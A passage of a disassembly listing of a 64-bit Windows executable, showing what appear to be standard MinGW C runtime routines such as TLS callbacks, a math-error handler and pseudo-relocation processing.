   140001e0b:	90                   	nop
   140001e0c:	90                   	nop
   140001e0d:	90                   	nop
   140001e0e:	90                   	nop
   140001e0f:	90                   	nop
   140001e10:	48 83 ec 28          	sub    $0x28,%rsp
   140001e14:	83 fa 03             	cmp    $0x3,%edx
   140001e17:	74 17                	je     0x140001e30
   140001e19:	85 d2                	test   %edx,%edx
   140001e1b:	74 13                	je     0x140001e30
   140001e1d:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e22:	48 83 c4 28          	add    $0x28,%rsp
   140001e26:	c3                   	ret
   140001e27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001e2e:	00 00 
   140001e30:	e8 9b 0a 00 00       	call   0x1400028d0
   140001e35:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e3a:	48 83 c4 28          	add    $0x28,%rsp
   140001e3e:	c3                   	ret
   140001e3f:	90                   	nop
   140001e40:	56                   	push   %rsi
   140001e41:	53                   	push   %rbx
   140001e42:	48 83 ec 28          	sub    $0x28,%rsp
   140001e46:	48 8b 05 63 36 00 00 	mov    0x3663(%rip),%rax        # 0x1400054b0
   140001e4d:	83 38 02             	cmpl   $0x2,(%rax)
   140001e50:	74 06                	je     0x140001e58
   140001e52:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001e58:	83 fa 02             	cmp    $0x2,%edx
   140001e5b:	74 13                	je     0x140001e70
   140001e5d:	83 fa 01             	cmp    $0x1,%edx
   140001e60:	74 4e                	je     0x140001eb0
   140001e62:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e67:	48 83 c4 28          	add    $0x28,%rsp
   140001e6b:	5b                   	pop    %rbx
   140001e6c:	5e                   	pop    %rsi
   140001e6d:	c3                   	ret
   140001e6e:	66 90                	xchg   %ax,%ax
   140001e70:	48 8d 1d f9 3d 00 00 	lea    0x3df9(%rip),%rbx        # 0x140005c70
   140001e77:	48 8d 35 f2 3d 00 00 	lea    0x3df2(%rip),%rsi        # 0x140005c70
   140001e7e:	48 39 f3             	cmp    %rsi,%rbx
   140001e81:	74 df                	je     0x140001e62
   140001e83:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001e8a:	00 00 00 00 
   140001e8e:	66 90                	xchg   %ax,%ax
   140001e90:	48 8b 03             	mov    (%rbx),%rax
   140001e93:	48 85 c0             	test   %rax,%rax
   140001e96:	74 02                	je     0x140001e9a
   140001e98:	ff d0                	call   *%rax
   140001e9a:	48 83 c3 08          	add    $0x8,%rbx
   140001e9e:	48 39 f3             	cmp    %rsi,%rbx
   140001ea1:	75 ed                	jne    0x140001e90
   140001ea3:	b8 01 00 00 00       	mov    $0x1,%eax
   140001ea8:	48 83 c4 28          	add    $0x28,%rsp
   140001eac:	5b                   	pop    %rbx
   140001ead:	5e                   	pop    %rsi
   140001eae:	c3                   	ret
   140001eaf:	90                   	nop
   140001eb0:	e8 1b 0a 00 00       	call   0x1400028d0
   140001eb5:	b8 01 00 00 00       	mov    $0x1,%eax
   140001eba:	48 83 c4 28          	add    $0x28,%rsp
   140001ebe:	5b                   	pop    %rbx
   140001ebf:	5e                   	pop    %rsi
   140001ec0:	c3                   	ret
   140001ec1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001ec8:	00 00 00 00 
   140001ecc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001ed0:	31 c0                	xor    %eax,%eax
   140001ed2:	c3                   	ret
   140001ed3:	90                   	nop
   140001ed4:	90                   	nop
   140001ed5:	90                   	nop
   140001ed6:	90                   	nop
   140001ed7:	90                   	nop
   140001ed8:	90                   	nop
   140001ed9:	90                   	nop
   140001eda:	90                   	nop
   140001edb:	90                   	nop
   140001edc:	90                   	nop
   140001edd:	90                   	nop
   140001ede:	90                   	nop
   140001edf:	90                   	nop
   140001ee0:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001ee7:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   140001eec:	0f 29 7c 24 60       	movaps %xmm7,0x60(%rsp)
   140001ef1:	44 0f 29 44 24 70    	movaps %xmm8,0x70(%rsp)
   140001ef7:	83 39 06             	cmpl   $0x6,(%rcx)
   140001efa:	0f 87 dc 00 00 00    	ja     0x140001fdc
   140001f00:	8b 01                	mov    (%rcx),%eax
   140001f02:	48 8d 15 db 33 00 00 	lea    0x33db(%rip),%rdx        # 0x1400052e4
   140001f09:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140001f0d:	48 01 d0             	add    %rdx,%rax
   140001f10:	ff e0                	jmp    *%rax
   140001f12:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001f18:	4c 8d 05 c0 32 00 00 	lea    0x32c0(%rip),%r8        # 0x1400051df
   140001f1f:	4c 8b 49 08          	mov    0x8(%rcx),%r9
   140001f23:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140001f29:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   140001f2e:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   140001f33:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   140001f38:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001f3d:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   140001f42:	e8 b9 12 00 00       	call   0x140003200
   140001f47:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140001f4c:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140001f51:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   140001f58:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   140001f5e:	48 8d 15 53 33 00 00 	lea    0x3353(%rip),%rdx        # 0x1400052b8
   140001f65:	48 89 c1             	mov    %rax,%rcx
   140001f68:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140001f6e:	e8 cd 0f 00 00       	call   0x140002f40
   140001f73:	90                   	nop
   140001f74:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   140001f79:	0f 28 7c 24 60       	movaps 0x60(%rsp),%xmm7
   140001f7e:	31 c0                	xor    %eax,%eax
   140001f80:	44 0f 28 44 24 70    	movaps 0x70(%rsp),%xmm8
   140001f86:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001f8d:	c3                   	ret
   140001f8e:	66 90                	xchg   %ax,%ax
   140001f90:	4c 8d 05 29 32 00 00 	lea    0x3229(%rip),%r8        # 0x1400051c0
   140001f97:	eb 86                	jmp    0x140001f1f
   140001f99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001fa0:	4c 8d 05 79 32 00 00 	lea    0x3279(%rip),%r8        # 0x140005220
   140001fa7:	e9 73 ff ff ff       	jmp    0x140001f1f
   140001fac:	0f 1f 40 00          	nopl   0x0(%rax)
   140001fb0:	4c 8d 05 49 32 00 00 	lea    0x3249(%rip),%r8        # 0x140005200
   140001fb7:	e9 63 ff ff ff       	jmp    0x140001f1f
   140001fbc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001fc0:	4c 8d 05 a9 32 00 00 	lea    0x32a9(%rip),%r8        # 0x140005270
   140001fc7:	e9 53 ff ff ff       	jmp    0x140001f1f
   140001fcc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001fd0:	4c 8d 05 71 32 00 00 	lea    0x3271(%rip),%r8        # 0x140005248
   140001fd7:	e9 43 ff ff ff       	jmp    0x140001f1f
   140001fdc:	4c 8d 05 c3 32 00 00 	lea    0x32c3(%rip),%r8        # 0x1400052a6
   140001fe3:	e9 37 ff ff ff       	jmp    0x140001f1f
   140001fe8:	90                   	nop
   140001fe9:	90                   	nop
   140001fea:	90                   	nop
   140001feb:	90                   	nop
   140001fec:	90                   	nop
   140001fed:	90                   	nop
   140001fee:	90                   	nop
   140001fef:	90                   	nop
   140001ff0:	db e3                	fninit
   140001ff2:	c3                   	ret
   140001ff3:	90                   	nop
   140001ff4:	90                   	nop
   140001ff5:	90                   	nop
   140001ff6:	90                   	nop
   140001ff7:	90                   	nop
   140001ff8:	90                   	nop
   140001ff9:	90                   	nop
   140001ffa:	90                   	nop
   140001ffb:	90                   	nop
   140001ffc:	90                   	nop
   140001ffd:	90                   	nop
   140001ffe:	90                   	nop
   140001fff:	90                   	nop
   140002000:	48 83 ec 48          	sub    $0x48,%rsp
   140002004:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140002009:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000200e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002013:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140002018:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   14000201d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140002022:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002027:	e8 d4 11 00 00       	call   0x140003200
   14000202c:	ba 01 00 00 00       	mov    $0x1,%edx
   140002031:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140002037:	48 8d 0d c2 32 00 00 	lea    0x32c2(%rip),%rcx        # 0x140005300
   14000203e:	49 89 c1             	mov    %rax,%r9
   140002041:	e8 e2 11 00 00       	call   0x140003228
   140002046:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   14000204b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002050:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002055:	e8 a6 11 00 00       	call   0x140003200
   14000205a:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   14000205f:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140002064:	48 89 c1             	mov    %rax,%rcx
   140002067:	e8 b4 0e 00 00       	call   0x140002f20
   14000206c:	e8 37 12 00 00       	call   0x1400032a8
   140002071:	90                   	nop
   140002072:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002079:	00 00 00 00 
   14000207d:	0f 1f 00             	nopl   (%rax)
   140002080:	56                   	push   %rsi
   140002081:	53                   	push   %rbx
   140002082:	48 83 ec 58          	sub    $0x58,%rsp
   140002086:	8b 1d 28 60 00 00    	mov    0x6028(%rip),%ebx        # 0x1400080b4
   14000208c:	85 db                	test   %ebx,%ebx
   14000208e:	0f 8e 1c 01 00 00    	jle    0x1400021b0
   140002094:	48 8b 05 1d 60 00 00 	mov    0x601d(%rip),%rax        # 0x1400080b8
   14000209b:	45 31 c9             	xor    %r9d,%r9d
   14000209e:	48 83 c0 18          	add    $0x18,%rax
   1400020a2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400020a9:	00 00 00 00 
   1400020ad:	0f 1f 00             	nopl   (%rax)
   1400020b0:	4c 8b 00             	mov    (%rax),%r8
   1400020b3:	4c 39 c1             	cmp    %r8,%rcx
   1400020b6:	72 14                	jb     0x1400020cc
   1400020b8:	4c 8b 50 08          	mov    0x8(%rax),%r10
   1400020bc:	45 8b 52 08          	mov    0x8(%r10),%r10d
   1400020c0:	4d 01 d0             	add    %r10,%r8
   1400020c3:	4c 39 c1             	cmp    %r8,%rcx
   1400020c6:	0f 82 8b 00 00 00    	jb     0x140002157
   1400020cc:	41 83 c1 01          	add    $0x1,%r9d
   1400020d0:	48 83 c0 28          	add    $0x28,%rax
   1400020d4:	41 39 d9             	cmp    %ebx,%r9d
   1400020d7:	75 d7                	jne    0x1400020b0
   1400020d9:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400020de:	e8 1d 0b 00 00       	call   0x140002c00
   1400020e3:	48 89 c6             	mov    %rax,%rsi
   1400020e6:	48 85 c0             	test   %rax,%rax
   1400020e9:	0f 84 e3 00 00 00    	je     0x1400021d2
   1400020ef:	48 63 d3             	movslq %ebx,%rdx
   1400020f2:	48 8b 05 bf 5f 00 00 	mov    0x5fbf(%rip),%rax        # 0x1400080b8
   1400020f9:	48 8d 1c 92          	lea    (%rdx,%rdx,4),%rbx
   1400020fd:	48 c1 e3 03          	shl    $0x3,%rbx
   140002101:	48 01 d8             	add    %rbx,%rax
   140002104:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140002108:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   14000210e:	e8 2d 0c 00 00       	call   0x140002d40
   140002113:	8b 56 0c             	mov    0xc(%rsi),%edx
   140002116:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   14000211c:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   140002120:	48 8b 05 91 5f 00 00 	mov    0x5f91(%rip),%rax        # 0x1400080b8
   140002127:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000212c:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   140002131:	ff 15 91 73 00 00    	call   *0x7391(%rip)        # 0x1400094c8
   140002137:	48 85 c0             	test   %rax,%rax
   14000213a:	74 7b                	je     0x1400021b7
   14000213c:	8b 44 24 44          	mov    0x44(%rsp),%eax
   140002140:	8d 50 fc             	lea    -0x4(%rax),%edx
   140002143:	83 e2 fb             	and    $0xfffffffb,%edx
   140002146:	74 08                	je     0x140002150
   140002148:	8d 50 c0             	lea    -0x40(%rax),%edx
   14000214b:	83 e2 bf             	and    $0xffffffbf,%edx
   14000214e:	75 10                	jne    0x140002160
   140002150:	83 05 5d 5f 00 00 01 	addl   $0x1,0x5f5d(%rip)        # 0x1400080b4
   140002157:	48 83 c4 58          	add    $0x58,%rsp
   14000215b:	5b                   	pop    %rbx
   14000215c:	5e                   	pop    %rsi
   14000215d:	c3                   	ret
   14000215e:	66 90                	xchg   %ax,%ax
   140002160:	83 f8 02             	cmp    $0x2,%eax
   140002163:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002168:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000216d:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140002173:	b8 04 00 00 00       	mov    $0x4,%eax
   140002178:	44 0f 44 c0          	cmove  %eax,%r8d
   14000217c:	48 03 1d 35 5f 00 00 	add    0x5f35(%rip),%rbx        # 0x1400080b8
   140002183:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140002187:	49 89 d9             	mov    %rbx,%r9
   14000218a:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000218e:	ff 15 2c 73 00 00    	call   *0x732c(%rip)        # 0x1400094c0
   140002194:	85 c0                	test   %eax,%eax
   140002196:	75 b8                	jne    0x140002150
   140002198:	ff 15 ba 72 00 00    	call   *0x72ba(%rip)        # 0x140009458
   14000219e:	48 8d 0d d3 31 00 00 	lea    0x31d3(%rip),%rcx        # 0x140005378
   1400021a5:	89 c2                	mov    %eax,%edx
   1400021a7:	e8 54 fe ff ff       	call   0x140002000
   1400021ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400021b0:	31 db                	xor    %ebx,%ebx
   1400021b2:	e9 22 ff ff ff       	jmp    0x1400020d9
   1400021b7:	48 8b 05 fa 5e 00 00 	mov    0x5efa(%rip),%rax        # 0x1400080b8
   1400021be:	8b 56 08             	mov    0x8(%rsi),%edx
   1400021c1:	48 8d 0d 78 31 00 00 	lea    0x3178(%rip),%rcx        # 0x140005340
   1400021c8:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   1400021cd:	e8 2e fe ff ff       	call   0x140002000
   1400021d2:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400021d7:	48 8d 0d 42 31 00 00 	lea    0x3142(%rip),%rcx        # 0x140005320
   1400021de:	e8 1d fe ff ff       	call   0x140002000
   1400021e3:	90                   	nop
   1400021e4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400021eb:	00 00 00 00 
   1400021ef:	90                   	nop
   1400021f0:	55                   	push   %rbp
   1400021f1:	41 56                	push   %r14
   1400021f3:	41 55                	push   %r13
   1400021f5:	41 54                	push   %r12
   1400021f7:	57                   	push   %rdi
   1400021f8:	56                   	push   %rsi
   1400021f9:	53                   	push   %rbx
   1400021fa:	48 83 ec 40          	sub    $0x40,%rsp
   1400021fe:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002203:	8b 3d a7 5e 00 00    	mov    0x5ea7(%rip),%edi        # 0x1400080b0
   140002209:	85 ff                	test   %edi,%edi
   14000220b:	74 13                	je     0x140002220
   14000220d:	48 89 ec             	mov    %rbp,%rsp
   140002210:	5b                   	pop    %rbx
   140002211:	5e                   	pop    %rsi
   140002212:	5f                   	pop    %rdi
   140002213:	41 5c                	pop    %r12
   140002215:	41 5d                	pop    %r13
   140002217:	41 5e                	pop    %r14
   140002219:	5d                   	pop    %rbp
   14000221a:	c3                   	ret
   14000221b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002220:	c7 05 86 5e 00 00 01 	movl   $0x1,0x5e86(%rip)        # 0x1400080b0
   140002227:	00 00 00 
   14000222a:	e8 51 0a 00 00       	call   0x140002c80
   14000222f:	48 98                	cltq
   140002231:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002235:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   14000223c:	00 
   14000223d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140002241:	e8 9a 0c 00 00       	call   0x140002ee0
   140002246:	4c 8b 25 a3 32 00 00 	mov    0x32a3(%rip),%r12        # 0x1400054f0
   14000224d:	48 8b 1d ac 32 00 00 	mov    0x32ac(%rip),%rbx        # 0x140005500
   140002254:	48 29 c4             	sub    %rax,%rsp
   140002257:	c7 05 53 5e 00 00 00 	movl   $0x0,0x5e53(%rip)        # 0x1400080b4
   14000225e:	00 00 00 
   140002261:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002266:	48 89 05 4b 5e 00 00 	mov    %rax,0x5e4b(%rip)        # 0x1400080b8
   14000226d:	4c 89 e0             	mov    %r12,%rax
   140002270:	48 29 d8             	sub    %rbx,%rax
   140002273:	48 83 f8 07          	cmp    $0x7,%rax
   140002277:	7e 94                	jle    0x14000220d
   140002279:	48 83 f8 0b          	cmp    $0xb,%rax
   14000227d:	0f 8f 75 01 00 00    	jg     0x1400023f8
   140002283:	8b 03                	mov    (%rbx),%eax
   140002285:	85 c0                	test   %eax,%eax
   140002287:	0f 85 73 02 00 00    	jne    0x140002500
   14000228d:	8b 43 04             	mov    0x4(%rbx),%eax
   140002290:	85 c0                	test   %eax,%eax
   140002292:	0f 85 68 02 00 00    	jne    0x140002500
   140002298:	8b 53 08             	mov    0x8(%rbx),%edx
   14000229b:	83 fa 01             	cmp    $0x1,%edx
   14000229e:	0f 85 b1 02 00 00    	jne    0x140002555
   1400022a4:	48 83 c3 0c          	add    $0xc,%rbx
   1400022a8:	4c 39 e3             	cmp    %r12,%rbx
   1400022ab:	0f 83 5c ff ff ff    	jae    0x14000220d
   1400022b1:	4c 8b 35 28 32 00 00 	mov    0x3228(%rip),%r14        # 0x1400054e0
   1400022b8:	eb 67                	jmp    0x140002321
   1400022ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400022c0:	83 fa 08             	cmp    $0x8,%edx
   1400022c3:	0f 84 57 01 00 00    	je     0x140002420
   1400022c9:	83 fa 10             	cmp    $0x10,%edx
   1400022cc:	0f 85 63 02 00 00    	jne    0x140002535
   1400022d2:	41 0f b7 75 00       	movzwl 0x0(%r13),%esi
   1400022d7:	66 85 f6             	test   %si,%si
   1400022da:	0f 89 08 02 00 00    	jns    0x1400024e8
   1400022e0:	48 81 ce 00 00 ff ff 	or     $0xffffffffffff0000,%rsi
   1400022e7:	48 29 ce             	sub    %rcx,%rsi
   1400022ea:	4c 01 ce             	add    %r9,%rsi
   1400022ed:	a8 c0                	test   $0xc0,%al
   1400022ef:	75 1a                	jne    0x14000230b
   1400022f1:	48 81 fe ff ff 00 00 	cmp    $0xffff,%rsi
   1400022f8:	0f 8f 43 02 00 00    	jg     0x140002541
   1400022fe:	48 81 fe 00 80 ff ff 	cmp    $0xffffffffffff8000,%rsi
   140002305:	0f 8c 36 02 00 00    	jl     0x140002541
   14000230b:	4c 89 e9             	mov    %r13,%rcx
   14000230e:	e8 6d fd ff ff       	call   0x140002080
   140002313:	66 41 89 75 00       	mov    %si,0x0(%r13)
   140002318:	48 83 c3 0c          	add    $0xc,%rbx
   14000231c:	4c 39 e3             	cmp    %r12,%rbx
   14000231f:	73 5f                	jae    0x140002380
   140002321:	8b 0b                	mov    (%rbx),%ecx
   140002323:	8b 43 08             	mov    0x8(%rbx),%eax
   140002326:	44 8b 6b 04          	mov    0x4(%rbx),%r13d
   14000232a:	4c 01 f1             	add    %r14,%rcx
   14000232d:	0f b6 d0             	movzbl %al,%edx
   140002330:	4c 8b 09             	mov    (%rcx),%r9
   140002333:	4d 01 f5             	add    %r14,%r13
   140002336:	83 fa 20             	cmp    $0x20,%edx
   140002339:	0f 84 31 01 00 00    	je     0x140002470
   14000233f:	0f 86 7b ff ff ff    	jbe    0x1400022c0
   140002345:	83 fa 40             	cmp    $0x40,%edx
   140002348:	0f 85 e7 01 00 00    	jne    0x140002535
   14000234e:	49 8b 75 00          	mov    0x0(%r13),%rsi
   140002352:	48 29 ce             	sub    %rcx,%rsi
   140002355:	4c 01 ce             	add    %r9,%rsi
   140002358:	a8 c0                	test   $0xc0,%al
   14000235a:	75 09                	jne    0x140002365
   14000235c:	48 85 f6             	test   %rsi,%rsi
   14000235f:	0f 89 dc 01 00 00    	jns    0x140002541
   140002365:	4c 89 e9             	mov    %r13,%rcx
   140002368:	48 83 c3 0c          	add    $0xc,%rbx
   14000236c:	e8 0f fd ff ff       	call   0x140002080
   140002371:	49 89 75 00          	mov    %rsi,0x0(%r13)
   140002375:	4c 39 e3             	cmp    %r12,%rbx
   140002378:	72 a7                	jb     0x140002321
   14000237a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002380:	8b 15 2e 5d 00 00    	mov    0x5d2e(%rip),%edx        # 0x1400080b4
   140002386:	85 d2                	test   %edx,%edx
   140002388:	0f 8e 7f fe ff ff    	jle    0x14000220d
   14000238e:	48 8b 0d 23 5d 00 00 	mov    0x5d23(%rip),%rcx        # 0x1400080b8
   140002395:	48 8b 35 24 71 00 00 	mov    0x7124(%rip),%rsi        # 0x1400094c0
   14000239c:	31 db                	xor    %ebx,%ebx
   14000239e:	66 90                	xchg   %ax,%ax
   1400023a0:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
   1400023a4:	44 8b 00             	mov    (%rax),%r8d
   1400023a7:	45 85 c0             	test   %r8d,%r8d
   1400023aa:	74 36                	je     0x1400023e2
   1400023ac:	48 8b 50 10          	mov    0x10(%rax),%rdx
   1400023b0:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400023b4:	4c 8d 4d fc          	lea    -0x4(%rbp),%r9
   1400023b8:	83 c7 01             	add    $0x1,%edi
   1400023bb:	ff d6                	call   *%rsi
   1400023bd:	8b 15 f1 5c 00 00    	mov    0x5cf1(%rip),%edx        # 0x1400080b4
   1400023c3:	39 d7                	cmp    %edx,%edi
   1400023c5:	0f 8d 42 fe ff ff    	jge    0x14000220d
   1400023cb:	48 8b 0d e6 5c 00 00 	mov    0x5ce6(%rip),%rcx        # 0x1400080b8
   1400023d2:	48 83 c3 28          	add    $0x28,%rbx
   1400023d6:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
   1400023da:	44 8b 00             	mov    (%rax),%r8d
   1400023dd:	45 85 c0             	test   %r8d,%r8d
   1400023e0:	75 ca                	jne    0x1400023ac
   1400023e2:	83 c7 01             	add    $0x1,%edi
   1400023e5:	39 d7                	cmp    %edx,%edi
   1400023e7:	0f 8d 20 fe ff ff    	jge    0x14000220d
   1400023ed:	48 83 c3 28          	add    $0x28,%rbx
   1400023f1:	eb ad                	jmp    0x1400023a0
   1400023f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023f8:	8b 13                	mov    (%rbx),%edx
   1400023fa:	85 d2                	test   %edx,%edx
   1400023fc:	0f 85 fe 00 00 00    	jne    0x140002500
   140002402:	8b 43 04             	mov    0x4(%rbx),%eax
   140002405:	89 c2                	mov    %eax,%edx
   140002407:	0b 53 08             	or     0x8(%rbx),%edx
   14000240a:	0f 85 80 fe ff ff    	jne    0x140002290
   140002410:	48 83 c3 0c          	add    $0xc,%rbx
   140002414:	e9 6a fe ff ff       	jmp    0x140002283
   140002419:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002420:	41 0f b6 75 00       	movzbl 0x0(%r13),%esi
   140002425:	40 84 f6             	test   %sil,%sil
   140002428:	0f 89 a2 00 00 00    	jns    0x1400024d0
   14000242e:	48 81 ce 00 ff ff ff 	or     $0xffffffffffffff00,%rsi
   140002435:	48 29 ce             	sub    %rcx,%rsi
   140002438:	4c 01 ce             	add    %r9,%rsi
   14000243b:	a8 c0                	test   $0xc0,%al
   14000243d:	75 17                	jne    0x140002456
   14000243f:	48 81 fe ff 00 00 00 	cmp    $0xff,%rsi
   140002446:	0f 8f f5 00 00 00    	jg     0x140002541
   14000244c:	48 83 fe 80          	cmp    $0xffffffffffffff80,%rsi
   140002450:	0f 8c eb 00 00 00    	jl     0x140002541
   140002456:	4c 89 e9             	mov    %r13,%rcx
   140002459:	e8 22 fc ff ff       	call   0x140002080
   14000245e:	41 88 75 00          	mov    %sil,0x0(%r13)
   140002462:	e9 b1 fe ff ff       	jmp    0x140002318
   140002467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000246e:	00 00 
   140002470:	41 8b 75 00          	mov    0x0(%r13),%esi
   140002474:	85 f6                	test   %esi,%esi
   140002476:	79 48                	jns    0x1400024c0
   140002478:	49 ba 00 00 00 00 ff 	movabs $0xffffffff00000000,%r10
   14000247f:	ff ff ff 
   140002482:	4c 09 d6             	or     %r10,%rsi
   140002485:	48 29 ce             	sub    %rcx,%rsi
   140002488:	4c 01 ce             	add    %r9,%rsi
   14000248b:	a8 c0                	test   $0xc0,%al
   14000248d:	75 1b                	jne    0x1400024aa
   14000248f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002494:	48 39 c6             	cmp    %rax,%rsi
   140002497:	0f 8f a4 00 00 00    	jg     0x140002541
   14000249d:	48 81 fe 00 00 00 80 	cmp    $0xffffffff80000000,%rsi
   1400024a4:	0f 8c 97 00 00 00    	jl     0x140002541
   1400024aa:	4c 89 e9             	mov    %r13,%rcx
   1400024ad:	e8 ce fb ff ff       	call   0x140002080
   1400024b2:	41 89 75 00          	mov    %esi,0x0(%r13)
   1400024b6:	e9 5d fe ff ff       	jmp    0x140002318
   1400024bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024c0:	48 29 ce             	sub    %rcx,%rsi
   1400024c3:	4c 01 ce             	add    %r9,%rsi
   1400024c6:	a8 c0                	test   $0xc0,%al
   1400024c8:	74 c5                	je     0x14000248f
   1400024ca:	eb de                	jmp    0x1400024aa
   1400024cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400024d0:	48 29 ce             	sub    %rcx,%rsi
   1400024d3:	4c 01 ce             	add    %r9,%rsi
   1400024d6:	a8 c0                	test   $0xc0,%al
   1400024d8:	0f 84 61 ff ff ff    	je     0x14000243f
   1400024de:	e9 73 ff ff ff       	jmp    0x140002456
   1400024e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024e8:	48 29 ce             	sub    %rcx,%rsi
   1400024eb:	4c 01 ce             	add    %r9,%rsi
   1400024ee:	a8 c0                	test   $0xc0,%al
   1400024f0:	0f 84 fb fd ff ff    	je     0x1400022f1
   1400024f6:	e9 10 fe ff ff       	jmp    0x14000230b
   1400024fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002500:	4c 39 e3             	cmp    %r12,%rbx
   140002503:	0f 83 04 fd ff ff    	jae    0x14000220d
   140002509:	4c 8b 35 d0 2f 00 00 	mov    0x2fd0(%rip),%r14        # 0x1400054e0
   140002510:	8b 73 04             	mov    0x4(%rbx),%esi
   140002513:	44 8b 2b             	mov    (%rbx),%r13d
   140002516:	48 83 c3 08          	add    $0x8,%rbx
   14000251a:	45 03 2c 36          	add    (%r14,%rsi,1),%r13d
   14000251e:	4a 8d 0c 36          	lea    (%rsi,%r14,1),%rcx
   140002522:	e8 59 fb ff ff       	call   0x140002080
   140002527:	45 89 2c 36          	mov    %r13d,(%r14,%rsi,1)
   14000252b:	4c 39 e3             	cmp    %r12,%rbx
   14000252e:	72 e0                	jb     0x140002510
   140002530:	e9 4b fe ff ff       	jmp    0x140002380
   140002535:	48 8d 0d 9c 2e 00 00 	lea    0x2e9c(%rip),%rcx        # 0x1400053d8
   14000253c:	e8 bf fa ff ff       	call   0x140002000
   140002541:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002546:	4d 89 e8             	mov    %r13,%r8
   140002549:	48 8d 0d b8 2e 00 00 	lea    0x2eb8(%rip),%rcx        # 0x140005408
   140002550:	e8 ab fa ff ff       	call   0x140002000
   140002555:	48 8d 0d 44 2e 00 00 	lea    0x2e44(%rip),%rcx        # 0x1400053a0
   14000255c:	e8 9f fa ff ff       	call   0x140002000
   140002561:	90                   	nop
   140002562:	90                   	nop
   140002563:	90                   	nop
   140002564:	90                   	nop
   140002565:	90                   	nop
   140002566:	90                   	nop
   140002567:	90                   	nop
   140002568:	90                   	nop
   140002569:	90                   	nop
   14000256a:	90                   	nop
   14000256b:	90                   	nop
   14000256c:	90                   	nop
   14000256d:	90                   	nop
   14000256e:	90                   	nop
   14000256f:	90                   	nop
   140002570:	48 83 ec 58          	sub    $0x58,%rsp
